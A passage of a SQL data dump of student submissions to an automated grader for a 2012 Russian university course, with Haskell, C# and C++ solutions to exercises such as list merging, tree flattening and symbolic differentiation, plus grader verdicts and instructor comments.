\r\n\r\n      yield return a[i++];\r\n\r\n    while (j < lb)\r\n\r\n      yield return b[j++];\r\n\r\n\r\n\r\n  }\r\n\r\n\r\n\r\n  public static void Main()\r\n\r\n  {\r\n\r\n    int [] a = { 1, 5, 8 };\r\n\r\n    int [] b = { 3, 5, 9 };\r\n\r\n    foreach (int i in Merge(a, b))\r\n\r\n    {\r\n\r\n      Console.WriteLine(i); \r\n\r\n    }\r\n\r\n\r\n\r\n\r\n\r\n  }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3466, 98, 'tonyo', '2012-11-13 16:02:59', 2, '  --- что-то не совсем то, ломается вот на таком примере\r\n  ---   let tr1 = Node ''a'' Empty Empty; tr2 = Node ''b'' tr1 tr1; tr3 = Node ''a'' tr2 tr2 in fromStr ( toStr tr3 )\r\n  --- Я его не буду вносить в систему тестирования, скорее всего (слишком длинный, система такме не очень понимает ((\r\n  --- Но вы проверьте его сами, пожалуйста\r\ndata Tree = Empty | Node Char Tree Tree                                                                                                                                                         \r\n  deriving Show\r\n\r\ntoStr Empty = "*"\r\ntoStr (Node ch lc rc) = "(" ++  (ch:[]) ++ " " ++ toStr lc ++ " " ++ toStr rc ++ ")"\r\n\r\nfromStr (''*'': str) = Empty\r\nfromStr (''('' : ch : '' '': str)  = Node ch (fromStr str) (fromStr str2)\r\n  where str2 = getRightChild str \r\n\r\ngetRightChild (''*'':xs) = tail xs\r\ngetRightChild (''('':xs) = getRightChild1 xs 0\r\n\r\ngetRightChild1 (x:xs) val\r\n  | x == '')'' && val == 0 = tail xs\r\n  | x == ''('' = getRightChild1 xs (val-1)\r\n  | x == ''('' = getRightChild1 xs (val+1)\r\n  | otherwise = getRightChild1 xs val', '<br/>Тесты успешно пройдены!'),
(3467, 91, '1705225', '2012-11-13 16:32:11', 1, 'merge xs [] = xs\r\nmerge [] ys = ys\r\nmerge allx@(x:xs) ally@(y:ys) \r\n	| x < y = x:merge xs ally\r\n	| y < x = y:merge allx ys\r\n	| otherwise = x:merge xs ys ', '<br/>Тесты успешно пройдены!'),
(3468, 86, '1705225', '2012-11-13 16:51:04', 1, 'allNondivisible'' [] cond = True\r\nallNondivisible'' (x:xs) cond =\r\n	if not $ cond x	then False\r\n					else allNondivisible'' xs (	 -> cond t && mod x t /= 0 && mod t x /= 0)\r\nallNondivisible xs = allNondivisible'' xs (	->True)\r\n\r\n-- в условии допущена ошибка, правда орфографическая =)\r\n-- "один делиться на другой"\r\n   --- Спасибо, исправлю! )', '<br/>Тесты успешно пройдены!'),
(3469, 97, 'Deutsche', '2012-11-13 17:06:42', 1, 'checkBrackets s = if ((length s) `mod` 2 == 1)\r\n			then False\r\n		  else checkBr s 0 0 []\r\n-- на всякий случай оставлю n1 и n2 тоже\r\ncheckBr "" n1 n2 stack = if ((n1 == 0)&&(n2 == 0)&&(stack ==[]))\r\n				then True\r\n			 else False\r\ncheckBr (''('':s) n1 n2 stack = checkBr s (n1+1) n2 (''('':stack)\r\ncheckBr ('')'':s) n1 n2 stack = if ((n1<=0)||(n2<0))\r\n				then False\r\n	                      else \r\n                              if (head stack == ''['') \r\n				then False\r\n			      else checkBr s (n1-1) n2 (tail stack)\r\ncheckBr (''['':s) n1 n2 stack = checkBr s n1 (n2+1) (''['':stack)\r\ncheckBr ('']'':s) n1 n2 stack = if ((n1<0)||(n2<=0))\r\n			        then False\r\n        	              else\r\n			      if (head stack == ''('') \r\n			        then False\r\n	                      else checkBr s n1 (n2-1) (tail stack)', '<br/>Тесты успешно пройдены!'),
(3470, 87, 'code', '2012-11-13 17:17:27', 1, 'data Expr = N Integer \r\n          | X \r\n          | Add  Expr Expr \r\n          | Mult Expr Expr \r\n  deriving Show \r\n             \r\ndiff :: Expr -> Expr \r\ndiff (N _)      = N 0 \r\ndiff  X         = N 1 \r\ndiff (Add  a b) = Add (diff a) (diff b) \r\ndiff (Mult a b) = Add (Mult (diff a) b) (Mult a (diff b)) \r\n                   \r\neval :: Expr -> Integer -> Integer \r\neval (N n)      _ = n \r\neval  X         x = x \r\neval (Add  a b) x = eval a x + eval b x \r\neval (Mult a b) x = eval a x * eval b x', '<br/>Тесты успешно пройдены!'),
(3471, 88, '1705225', '2012-11-13 17:17:59', 0, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\ndiff X = N 1\r\ndiff (N _) = N 0\r\ndiff (Add x y) = Add (diff x) (diff y)\r\ndiff (Mult x y) = Add (Mult x (diff y)) ((Mult y (diff x)))', 'Выражение имеет неправильное значение: diff (Mult X X)'),
(3472, 88, '1705225', '2012-11-13 17:19:03', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\ndiff X = N 1\r\ndiff (N _) = N 0\r\ndiff (Add x y) = Add (diff x) (diff y)\r\ndiff (Mult x y) = Add (Mult x (diff y)) (Mult (diff y) x)', 'Выражение имеет неправильное значение: diff (Mult X X)'),
(3473, 95, 'code', '2012-11-13 17:21:50', 2, 'public static bool allDiffrent(int[] a)\r\n{\r\n    if (a.Count() > 1)\r\n    {\r\n          return allDifferent1(a, 0, t => true);\r\n    }\r\n    else\r\n    {\r\n        return true;\r\n    }\r\n}\r\npublic static bool allDifferent1(int[] a, int from, Predicate<int> cond)\r\n{\r\n    if(from==a.Length-1)\r\n    {\r\n        return a[from-1] != a[from];\r\n    }\r\n\r\n    for (int i = from; i < a.Length; i++)\r\n    {\r\n          if(!cond(a[i]))\r\n          return false;\r\n    }\r\n          --- Нет, не совсем то. Тут идея была в том, чтобы каждый раз проверять условие только для\r\n          --- первого элемента. Зато условие на каждом шаге становится сложнее и сложнее\r\n          --- (см ниже)\r\n    from++;\r\n    return allDifferent1(a, from, t => t!=a[from-1]);\r\n        --- Те тут надо ''усложнять'' условие: все, что было раньше и еще t!=a[from-1])\r\n}', '<br/>Тесты успешно пройдены!'),
(3474, 96, 'code', '2012-11-13 17:22:41', 1, 'public static IEnumerable Merge(int[] a, int[] b)\r\n{\r\n    IEnumerator x = a.GetEnumerator();\r\n    IEnumerator y = b.GetEnumerator();\r\n    y.MoveNext();\r\n    bool yFinish = false; \r\n    while (x.MoveNext())\r\n    { \r\n        if (!yFinish)\r\n        {\r\n            if ((int)x.Current < (int)y.Current)\r\n            {\r\n                yield return (int)x.Current;\r\n            }\r\n            if ((int)x.Current > (int)y.Current)\r\n           {\r\n               while ((int)x.Current > (int)y.Current)\r\n              {\r\n                    yield return (int)y.Current;\r\n                    if (!y.MoveNext())\r\n                    {\r\n                          yFinish = true;\r\n                    }\r\n              }\r\n        }\r\n        if ((int)x.Current == (int)y.Current)\r\n        {\r\n              yield return (int)y.Current;\r\n              if (!y.MoveNext())\r\n              {\r\n                    yFinish = true;\r\n              }\r\n        }\r\n     }\r\n     else\r\n     {\r\n          yield return (int)x.Current;\r\n     }\r\n  }\r\n  if (!yFinish)\r\n  {\r\n  ', '<br/>Тесты успешно пройдены!'),
(3475, 85, '383483', '2012-11-13 17:29:17', 0, 'data Ration = Rat Integer Integer\r\ninstance Eq Ration where Rat n1 d1 == Rat n2 d2 = n1==n2 && d1==d2\r\ninstance Num Ration where (Rat n1 d1) + (Rat n2 d2) = Rat (n1*d2+n2*d1) (d1*d2)\r\ninstance Show Ration where show (Rat n d) = show n ++ "/" ++ show d \r\ninstance Ord Ration where (Rat n1 d1) < (Rat n2 d2) = (n1*d2)<(n2*d1)', 'Хитрый тест номер 2 не пройден :(<br/>Подсказка: Числа ведь могут быть и отрицательными...'),
(3476, 99, 'tonyo', '2012-11-13 17:31:47', 1, '#include <iostream>\r\n\r\n\r\n\r\nusing namespace std;\r\n\r\n\r\n\r\n// По-хорошему, нужно еще разобраться с освобождением памяти:\r\n\r\n// описать деструкторы для каждого объекта, которые вызывают\r\n\r\n// деструкторы подвыражений. А чтобы это корректно работало,\r\n\r\n// надо еще и корректно описать конструктор копий, и передавать\r\n\r\n// в конструкторы подвыражения уже копии.\r\n\r\n// Настолько решил не усложнять.\r\n   --- И еще оператор = надо переопределить, кстати.\r\n   --- (Но, просто как замечание, для начала можно их просто запретить (обьявить private)\r\n   --- чтобы они точно не могли вызваться. Еще несколько технических замечаний см ниже\r\n\r\n\r\nclass Expr\r\n\r\n{\r\n\r\npublic:\r\n\r\n  virtual ~Expr() {};\r\n\r\n\r\n\r\n  virtual Expr *diff() = 0;\r\n\r\n  virtual void show() = 0;   \r\n       --- Оба метода лучше описать, как const\r\n};\r\n\r\n\r\n\r\n\r\n\r\nclass Add : public Expr\r\n\r\n{\r\n\r\npublic:\r\n\r\n  Add(Expr *ex1, Expr *ex2)\r\n     --- И тут тоже всюду лучше const Expr*\r\n  : ex1(ex1), ex2(ex2)\r\n\r\n  {}\r\n\r\n\r\n\r\n  virtual Expr *diff();\r\n\r\n  virtual void show();\r\n     --- Просто как замечание, в производных классах virtual можно не писать.\r\n\r\nprotected:\r\n\r\n  Expr *ex1, *ex2; \r\n\r\n};\r\n\r\n\r\n\r\n\r\n\r\nclass Mult : public Expr\r\n\r\n{\r\n\r\npublic:\r\n\r\n  Mult(Expr *ex1, Expr *ex2)\r\n\r\n  : ex1(ex1), ex2(ex2) \r\n\r\n  {}\r\n\r\n\r\n\r\n  virtual Expr *diff();\r\n\r\n  virtual void show();\r\n\r\nprotected:\r\n\r\n  Expr *ex1, *ex2; \r\n\r\n};\r\n\r\n\r\n\r\n\r\n\r\nclass X : public Expr\r\n\r\n{\r\n\r\npublic:\r\n\r\n  X()\r\n\r\n  {}\r\n\r\n\r\n\r\n  virtual Expr *diff();\r\n\r\n  virtual void show();\r\n\r\n};\r\n\r\n\r\n\r\n\r\n\r\nclass Int : public Expr\r\n\r\n{\r\n\r\npublic:\r\n\r\n  Int(int i)\r\n\r\n  : val(i) \r\n\r\n  {}\r\n\r\n\r\n\r\n  virtual Expr *diff();\r\n\r\n  virtual void show();\r\n\r\nprotected:\r\n\r\n  int val;\r\n\r\n};\r\n\r\n\r\n\r\n\r\n\r\nExpr *Add::diff()\r\n\r\n{\r\n\r\n  return new Add(ex1->diff(), ex2->diff());\r\n\r\n}\r\n\r\n\r\n\r\n\r\n\r\nvoid Add::show()\r\n\r\n{\r\n\r\n  cout << "Add (";\r\n\r\n  ex1->show();\r\n\r\n  cout << ", ";\r\n\r\n  ex2->show();\r\n\r\n  cout << ")";\r\n\r\n}\r\n\r\n\r\n\r\nExpr *Mult::diff()\r\n\r\n{\r\n\r\n  Expr *add1 = new Mult(ex1->diff(), ex2);\r\n\r\n  Expr *add2 = new Mult(ex1, ex2->diff());\r\n\r\n\r\n\r\n  return new Add(add1, add2);\r\n\r\n}\r\n\r\n\r\n\r\n\r\n\r\nvoid Mult::show()\r\n\r\n{\r\n\r\n  cout << "Mult (";\r\n\r\n  ex1->show();\r\n\r\n  cout << ", ";\r\n\r\n  ex2->show();\r\n\r\n  cout << ")";\r\n\r\n}\r\n\r\n\r\n\r\n\r\n\r\nExpr *Int::diff()\r\n\r\n{\r\n\r\n  return new Int(0);\r\n\r\n}\r\n\r\n\r\n\r\n\r\n\r\nvoid Int::show()\r\n\r\n{\r\n\r\n  cout << "N " << val;\r\n\r\n}\r\n\r\n\r\n\r\n\r\n\r\nExpr *X::diff()\r\n\r\n{\r\n\r\n  return new Int(1);\r\n\r\n}\r\n\r\n\r\n\r\n\r\n\r\nvoid X :: show()\r\n\r\n{\r\n\r\n  cout << "X";\r\n\r\n}\r\n\r\n\r\n\r\n\r\n\r\nint main()\r\n\r\n{\r\n\r\n  Int a(3), b(4);\r\n\r\n  Expr *e = new Mult(new X(), new X());\r\n\r\n  e->show();\r\n\r\n  cout << "\r\n";\r\n\r\n  Expr *e2 = e->diff();\r\n\r\n  e2->show();\r\n\r\n\r\n\r\n  return 0;\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3477, 85, '383483', '2012-11-13 17:49:53', 1, 'data Ration = Rat Integer Integer\r\ninstance Eq Ration where Rat n1 d1 == Rat n2 d2 = abs n1==abs n2 && abs d1==abs d2 && signum (n1*d1)==signum (n2*d2)\r\ninstance Num Ration where (Rat n1 d1) + (Rat n2 d2) = Rat (n1*d2+n2*d1) (d1*d2)\r\ninstance Show Ration where show (Rat n d) = if (n>0&&d>0)||(n<0&&d<0) then show (abs n) ++ "/" ++ show (abs d) else "-" ++ show (abs n) ++ "/" ++ show (abs d)\r\ninstance Ord Ration where (Rat n1 d1) < (Rat n2 d2) = (signum (n1*d1))*(abs n1)*(abs d2)<(signum (n2*d2))*(abs n2)*(abs d1)', '<br/>Тесты успешно пройдены!'),
(3478, 94, 'code', '2012-11-13 18:20:03', 1, 'data Scheme a = Res a | Par (Scheme a) (Scheme a) | Seq (Scheme a) (Scheme a)\r\n\r\n\r\n\r\ndata Drawing = Drawing Int Int [String]\r\n\r\n\r\n\r\ninstance Show Drawing where\r\n\r\n  show (Drawing _ _ s) = unlines s\r\n\r\n\r\n\r\nsize :: Drawing -> (Int, Int)\r\n\r\nsize (Drawing x y _) = (x, y)\r\n\r\n\r\n\r\nwireH :: Int -> Drawing\r\n\r\nwireH x = Drawing x 1 [replicate x ''-'']\r\n\r\n\r\n\r\nwireV :: Int -> Drawing\r\n\r\nwireV x = Drawing 1 x (replicate x "|")\r\n\r\n\r\n\r\njoint :: Drawing\r\n\r\njoint = Drawing 1 1 ["+"]\r\n\r\n    \r\n\r\nspace :: Int -> Int -> Drawing\r\n\r\nspace x y = Drawing x y (replicate y (replicate x '' ''))\r\n\r\n\r\n\r\n(<->) :: Drawing -> Drawing -> Drawing\r\n\r\n(<->) (Drawing x1 y1 s1) (Drawing x2 y2 s2) = \r\n\r\n  if y1 /= y2 then error "(<->): unequal heights!"\r\n\r\n              else Drawing (x1+x2) y1 (zipWith (++) s1 s2) \r\n\r\n                   \r\n\r\n(<|>) :: Drawing -> Drawing -> Drawing\r\n\r\n(<|>) (Drawing x1 y1 s1) (Drawing x2 y2 s2) = \r\n\r\n  if x1 /= x2 then error "(<|>): unequal widths!"\r\n\r\n              else Drawing x1 (y1+y2) (s1 ++ s2)\r\n\r\n                   \r\n\r\nextendH :: Int -> Drawing -> Drawing\r\n\r\nextendH xx d = extendV y (wireH xLeft) <-> d <-> extendV y (wireH xRight)\r\n\r\n  where\r\n\r\n    (x, y) = size d\r\n\r\n    xPlus = max 0 (xx - x)\r\n\r\n    xLeft = xPlus `div` 2\r\n\r\n    xRight = xPlus - xLeft\r\n\r\n    \r\n\r\nextendV :: Int -> Drawing -> Drawing\r\n\r\nextendV yy d = space x yUp <|> d <|> space x yDown\r\n\r\n  where\r\n\r\n    (x, y) = size d\r\n\r\n    yPlus = max 0 (yy - y)    \r\n\r\n    yUp   = yPlus `div` 2\r\n\r\n    yDown = yPlus - yUp\r\n\r\n\r\n\r\ncombinePar :: Drawing -> Drawing -> Drawing\r\n\r\ncombinePar d1 d2 =  sideConnection\r\n\r\n                <-> (extendH (x+4) d1 <|> space (x+4) 1 <|> extendH (x+4) d2)\r\n\r\n                <-> sideConnection\r\n\r\n  where\r\n\r\n    (x1, y1) = size d1\r\n\r\n    (x2, y2) = size d2\r\n\r\n    x        = max x1 x2\r\n\r\n    sideConnection =  space 1 (y1 `div` 2)\r\n\r\n                  <|> joint\r\n\r\n                  <|> wireV ((y1+y2) `div` 2 - y1 `div` 2 - 1)    \r\n\r\n                  <|> joint\r\n\r\n                  <|> wireV ((y1+y2) `div` 2 - y2 `div` 2 - 1)\r\n\r\n                  <|> joint\r\n\r\n                  <|> space 1 (y2 `div` 2)\r\n\r\n    \r\n\r\ncombineSeq :: Drawing -> Drawing -> Drawing\r\n\r\ncombineSeq d1 d2 = extendV y d1 <-> extendV y (wireH 2) <-> extendV y d2  \r\n\r\n  where\r\n\r\n    (x1, y1) = size d1\r\n\r\n    (x2, y2) = size d2\r\n\r\n    y        = max y1 y2\r\n\r\n    \r\n\r\ndrawRes :: String -> Drawing\r\n\r\ndrawRes label = Drawing (length label + 2) 1 ["(" ++ label ++ ")"]\r\n\r\n    \r\n\r\ndraw :: Show a => Scheme a -> Drawing\r\n\r\ndraw s = extendH (fst (size drawing) + 8) drawing\r\n\r\n  where\r\n\r\n    drawing = draw'' s\r\n\r\n    draw'' (Res s)     = drawRes (show s)\r\n\r\n    draw'' (Par s1 s2) = combinePar (draw'' s1) (draw'' s2)\r\n\r\n    draw'' (Seq s1 s2) = combineSeq (draw'' s1) (draw'' s2)\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3479, 89, 'code', '2012-11-13 18:25:28', 1, 'data Tree a = Empty | Node a (Tree a) (Tree a) \r\n\r\nflatten :: Tree a -> [a] \r\nflatten t = flatten2 t [] \r\n  where \r\n    flatten2 Empty          ans = ans \r\n    flatten2 (Node x lt rt) ans = x : flatten2 lt (flatten2 rt ans)', '<br/>Тесты успешно пройдены!'),
(3480, 99, 'Deutsche', '2012-11-13 18:46:40', 1, '   --- Засчитано, но, мне кажется, это не совсем по условию.\r\n   --- Там было написано "надо придумать какое-то свое внутреннее представление для символьных выражений "\r\n   --- Ваше представление - это строка, и врядли его можно назвать внутренним) ОК, все может быть внутренним\r\n   --- но хранить выражение, как строку мне кажется неудобно. Для любой операции придется его парсировать.\r\n   --- Мне кажется, лучше завести в памяти что-то вроде дерева, описывающего структуру выражения.\r\n   --- Но ОК, хорошо, все работает, и решение интересное.\r\n\r\n﻿// Задача 26.1 Чистяков П.П. 543 гр.\r\n\r\nusing System;\r\n\r\nusing System.Collections.Generic;\r\n\r\nusing System.Linq;\r\n\r\nusing System.Text;\r\n\r\n\r\n\r\nnamespace _26._1\r\n\r\n{\r\n\r\n    class Program\r\n\r\n    {\r\n\r\n        /*data Expr = X|N Integer|Add Expr Expr|Mult Expr Expr deriving Show\r\n\r\n\r\n\r\n          diff X = (N 1)\r\n\r\n          diff (N v) = (N 0)\r\n\r\n          diff (Add l r) = Add (diff l) (diff r)\r\n\r\n          diff (Mult l r) = Add (Mult (diff l) r) (Mult l (diff r))\r\n\r\n         */\r\n\r\n\r\n\r\n        // Здесь аналогично, только X ещё также везде заключается в скобки: (X)\r\n\r\n\r\n\r\n        // нахождение нужной закрывающей скобки\r\n\r\n        public static int findClosingBracketPos(string s, int start)\r\n\r\n        {\r\n\r\n            int count = 1;\r\n\r\n            int cur = start + 1;\r\n\r\n            while (count != 0)\r\n\r\n            {\r\n\r\n                if (s[cur] == '')'')\r\n\r\n                {\r\n\r\n                    count--;\r\n\r\n                    cur++;\r\n\r\n                }\r\n\r\n                else\r\n\r\n                    if (s[cur] == ''('')\r\n\r\n                    {\r\n\r\n                        count++;\r\n\r\n                        cur++;\r\n\r\n                    }\r\n\r\n                    else cur++;\r\n\r\n            }\r\n\r\n            return cur - 1;\r\n\r\n        }\r\n\r\n\r\n\r\n        public static string Diff(string input)\r\n\r\n        {\r\n\r\n            if (input == "X")\r\n\r\n                return "N 1";\r\n\r\n            else\r\n\r\n            if (input.Substring(0, 2) == "N ")\r\n\r\n                return "N 0";\r\n\r\n            else\r\n\r\n                if (input.Substring(0, 4) == "Add ")\r\n\r\n                {\r\n\r\n                    int clPos = findClosingBracketPos(input, 4);\r\n\r\n                    string first = input.Substring(5, clPos - 5);\r\n\r\n                    string rest = input.Substring(clPos + 3);\r\n\r\n                    string second = rest.Substring(0, rest.Length - 1);\r\n\r\n                    return ("Add (" + Diff(first) + ") (" + Diff(second) + ")");\r\n\r\n                }\r\n\r\n                else\r\n\r\n                {\r\n\r\n                    int clPos = findClosingBracketPos(input, 5);\r\n\r\n                    string first = input.Substring(6, clPos - 6);\r\n\r\n                    string rest = input.Substring(clPos + 3);\r\n\r\n                    string second = rest.Substring(0, rest.Length - 1);\r\n\r\n                    return ("Add (Mult (" + Diff(first) + ") (" + second + ")) (Mult (" + first + ") (" + Diff(second) + "))");\r\n\r\n                }\r\n\r\n        }\r\n\r\n\r\n\r\n        static void Main(string[] args)\r\n\r\n        {\r\n\r\n            Console.WriteLine("Language as in 22.4; NOTE: writing (X) with brackets too.");\r\n\r\n            Console.WriteLine("");\r\n\r\n            Console.WriteLine("Input expression like this: diff (Add (Mult (X) (X)) (X))");\r\n\r\n            string input = Console.ReadLine();\r\n\r\n            while (input != "")\r\n\r\n            {\r\n\r\n                string input1 = input.Substring(6, input.Length - 7);\r\n\r\n                Console.WriteLine("Result of differentiation: ");\r\n\r\n                Console.WriteLine(Diff(input1));\r\n\r\n                Console.ReadLine();\r\n\r\n                Console.WriteLine("Input expression such this: diff (Add (Mult (X) (X)) (X))");\r\n\r\n                input = Console.ReadLine();\r\n\r\n            }\r\n\r\n        }\r\n\r\n    }\r\n\r\n}\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3481, 86, '383483', '2012-11-13 18:48:00', 0, 'allNonDivisible xs = ff xs (	->True)\r\nff [] cond = True\r\nff (x:xs) cond = if (cond x==False) then False else ff xs (	->(cond t) && (mod x t/=0) && (mod t x/=0))', 'Не удалось вычислить выражение "allNondivisible [2, 7, 6, 5]", проверьте правильность синтаксиса'),
(3482, 86, '383483', '2012-11-13 18:49:06', 1, 'allNondivisible xs = ff xs (	->True)\r\nff [] cond = True\r\nff (x:xs) cond = if (cond x==False) then False else ff xs (	->(cond t) && (mod x t/=0) && (mod t x/=0))', '<br/>Тесты успешно пройдены!'),
(3483, 96, 'tonyo', '2012-11-13 19:26:29', 1, 'using System;\r\n\r\nusing System.Collections.Generic;\r\n\r\n\r\n\r\npublic class Pr24_2\r\n\r\n{\r\n\r\n\r\n\r\n  public static IEnumerable<int> Merge(IEnumerable<int> a, IEnumerable<int> b)\r\n\r\n  {\r\n\r\n    IEnumerator<int> ena = a.GetEnumerator();\r\n\r\n    IEnumerator<int> enb = b.GetEnumerator();\r\n\r\n    IEnumerator<int> cont;\r\n\r\n    \r\n\r\n    // ena is empty\r\n\r\n    if (!ena.MoveNext())\r\n\r\n    {\r\n\r\n      while (enb.MoveNext())\r\n\r\n        yield return enb.Current;\r\n\r\n      yield break;\r\n\r\n    }\r\n\r\n\r\n\r\n    // enb is empty\r\n\r\n    if (!enb.MoveNext())\r\n\r\n    {\r\n\r\n      while (ena.MoveNext())\r\n\r\n        yield return ena.Current;\r\n\r\n      yield break;\r\n\r\n    }\r\n\r\n\r\n\r\n\r\n\r\n    while (true)\r\n\r\n    {\r\n\r\n      if (ena.Current == enb.Current)\r\n\r\n      {\r\n\r\n        if (!ena.MoveNext())\r\n\r\n        {\r\n\r\n          cont = enb;\r\n\r\n          break;        \r\n\r\n        }\r\n\r\n      }\r\n\r\n\r\n\r\n      if (ena.Current < enb.Current)\r\n\r\n      {\r\n\r\n        yield return ena.Current;\r\n\r\n        if (!ena.MoveNext())\r\n\r\n        {\r\n\r\n          cont = enb;\r\n\r\n          break;\r\n\r\n        }\r\n\r\n      }\r\n\r\n      else \r\n\r\n      {\r\n\r\n        yield return enb.Current;\r\n\r\n        if (!enb.MoveNext())\r\n\r\n        {\r\n\r\n          cont = ena; \r\n\r\n          break;\r\n\r\n        }\r\n\r\n      }\r\n\r\n    }\r\n\r\n\r\n\r\n    do {\r\n\r\n      yield return cont.Current;\r\n\r\n    } while (cont.MoveNext());\r\n\r\n\r\n\r\n  }\r\n\r\n\r\n\r\n  public static void Main()\r\n\r\n  {\r\n\r\n    int [] a = { 1, 2, 3};\r\n\r\n    int [] b = { 3, 5, 9 };\r\n\r\n    foreach (int i in Merge(a, b))\r\n\r\n    {\r\n\r\n      Console.WriteLine(i); \r\n\r\n    }\r\n\r\n\r\n\r\n  }\r\n\r\n}\r\n\r\n\r\n', '<br/>Тесты успешно пройдены!'),
(3484, 87, '1705225', '2012-11-13 19:34:23', 1, 'data Expr = X | N Integer | Add Expr Expr | Mult Expr Expr deriving Show\r\n\r\neval (N n) _ 	= n\r\neval X val 		= val\r\neval (Add a b) val	= (+) (eval a val) (eval b val)\r\neval (Mult a b) val	= (*) (eval a val) (eval b val)', '<br/>Тесты успешно пройдены!'),
(3485, 89, '383483', '2012-11-13 19:34:46', 1, 'data Tree = Empty|Node Integer Tree Tree\r\nflatten Empty=[]\r\nflatten (Node x l r) = x:(flatten l)++(flatten r)', '<br/>Тесты успешно пройдены!'),
(3486, 90, '383483', '2012-11-13 19:51:30', 1, 'findSame (x:xs) = ff x xs xs\r\n\r\nff x [] [] = "No same elements.."\r\nff x [] ys = ff (head ys) (tail ys) (tail ys)\r\nff x xs ys \r\n	  | (x==head xs) = "Element "++show x++" appears more than once!"\r\n	  | otherwise = ff x (tail xs) ys\r\n', '<br/>Тесты успешно пройдены!'),
(3487, 89, 'hasp', '2012-11-13 19:57:06', 1, 'data Tree a = Empty | Node a (Tree a) (Tree a) deriving Show \r\n\r\nflattenI Empty acc = acc\r\nflattenI (Node v left right) acc = let rightAcc = flattenI right acc in v:(flattenI left rightAcc) \r\n\r\nflatten tree = flattenI tree [] \r\n', '<br/>Тесты успешно пройдены!'),
(3488, 87, 'hasp', '2012-11-13 20:01:24', 1, 'data Expr = X | N Int | Add Expr Expr | Mult Expr Expr deriving Show \r\n\r\neval X v = v \r\neval (N c) v = c\r\neval (Add left right) v = (eval left v) + (eval right v) \r\neval (Mult left right) v = (eval left v) * (eval right v) ', '<br/>Тесты успешно пройдены!'),
(3489, 88, 'hasp', '2012-11-13 20:05:44', 1, 'data Expr = X | N Int | Add Expr Expr | Mult Expr Expr deriving Show \r\n\r\ndiff X = N 1 \r\ndiff (N _) = N 0\r\ndiff (Add left right) = Add (diff left) (diff right)\r\ndiff (Mult left right) = Add (Mult (diff left) right) (Mult left (diff right)) \r\n', '<br/>Тесты успешно пройдены!'),
(3490, 86, 'hasp', '2012-11-13 20:23:17', 1, 'type MySet a = a -> Bool\r\n\r\nsinglt e = (a -> a `mod` e == 0 || e `mod` a == 0)\r\n\r\nunion :: (MySet a) -> (MySet a) -> a -> Bool\r\nunion s1 s2 e = (s1 e) || (s2 e)\r\n\r\nallNondivisibleI [] _ = True\r\nallNondivisibleI (x:xs) acc = if acc x then False else allNondivisibleI xs (union acc (singlt x) )\r\n\r\nallNondivisible [] = True\r\nallNondivisible (x:xs) = allNondivisibleI xs (singlt x)', '<br/>Тесты успешно пройдены!'),
(3491, 90, '1705225', '2012-11-13 20:36:27', 1, 'findSame xs = eval xs []\r\n\r\neval [] _ = Nothing\r\neval (x:xs) seen = if elem x seen 	then Just x\r\n									else eval xs (x:seen)', '<br/>Тесты успешно пройдены!'),
(3492, 89, '1705225', '2012-11-13 20:57:43', 1, 'data Tree = Empty | Node Integer Tree Tree\r\n\r\nflatten (Node x left right) = (eval (Node x left right) id) []\r\n\r\neval Empty _ = id\r\neval (Node x left right) f = f.(x:).(eval left id).(eval right id)\r\n   --- Хорошая идея, но на самом деле я не очень понял зачем вам у eval второй параметр\r\n   --- По-моему, без него все тоже можно написать. Но ОК, мы это обсудим. \r\n', '<br/>Тесты успешно пройдены!'),
(3493, 85, 'hasp', '2012-11-13 21:15:40', 0, 'import Prelude hiding (Rational)\r\ndata Rational = Rat Int Int \r\n\r\nsimplify (Rat a b) = let g = gcd a b in (Rat (a `div` g) (b `div` g) )\r\nred (Rat r11 r12) (Rat r21 r22) = let g = gcd r12 r22; a1 = r12 `div` g; b1 = r22 `div` g; d = a1*b1*g in (Rat (r11*b1) d, Rat (r21*a1) d) \r\n\r\ninstance Eq Rational where\r\n	(==) r1 r2 = let Rat r11 r12 = simplify r1 in let Rat r21 r22 = simplify r2 in r11 == r21 && r12 == r22\r\ninstance Ord Rational where \r\n	(<) r1 r2 = let (Rat r11 _, Rat r12 _) = red r1 r2 in r11 < r12\r\ninstance Show Rational where\r\n	show (Rat r1 r2) = (show r1) ++ (''/'':(show r2) )\r\ninstance Num Rational where\r\n	(+) r1 r2 = let (Rat r11 r12 ,Rat r21 _) = red r1 r2 in simplify (Rat (r11 + r21) r12 )\r\n	(*) (Rat a b) (Rat c d) = Rat (a*c) (b*d)\r\n	negate (Rat a b) = Rat (-a) b\r\n	abs (Rat a b) = Rat (abs a) (abs b)\r\n	signum (Rat a b) = Rat (signum a) (signum b)\r\n	fromInteger i = Rat 1 1 --иначе проблемы с Int~=Integer', 'Хитрый тест номер 2 не пройден :(<br/>Подсказка: Числа ведь могут быть и отрицательными...'),
(3494, 91, '5656962', '2012-11-13 21:35:24', 1, 'merge [] list = list\r\n\r\nmerge list [] = list\r\n\r\nmerge [] [] = []\r\n\r\nmerge (x:xs) (y:ys) | x<y = x:(merge xs (y:ys)) \r\n\r\n					| x>y = y:(merge (x:xs) ys) \r\n\r\n					| x==y = y:(merge xs ys) \r\n\r\n			\r\n', '<br/>Тесты успешно пройдены!'),
(3495, 85, 'hasp', '2012-11-13 22:03:09', 1, 'import Prelude hiding (Rational)\r\ndata Rational = Rat Int Int \r\n\r\nsmp (Rat a b) = let g = gcd a b in (Rat (a `div` g) (b `div` g) )\r\nred (Rat l r) (Rat p q) = let g = gcd r q; a1 = r `div` g; b1 = q `div` g; d = abs (a1*b1*g) in (Rat (l*(abs b1)*(signum l) *(signum r)) d, Rat (p*(abs a1)*(signum q) *(signum p)) d) \r\n\r\ninstance Eq Rational where\r\n	(==) r1 r2 = let Rat r11 r12 = smp r1 in let Rat r21 r22 = smp r2 in r11 == r21 && r12 == r22\r\n            --- Ну или слева всюду можно писать в инфиксной форме: r1 == r2 = ... и т.д. \r\ninstance Ord Rational where \r\n	(<) r1 r2 = let (Rat r11 _, Rat r12 _) = red r1 r2 in r11 < r12\r\ninstance Show Rational where\r\n	show (Rat r1 r2) = (show r1) ++ (''/'':(show r2) )\r\ninstance Num Rational where\r\n	(+) r1 r2 = let (Rat r11 r12 ,Rat r21 _) = red r1 r2 in smp (Rat (r11 + r21) r12 )\r\n	(*) (Rat a b) 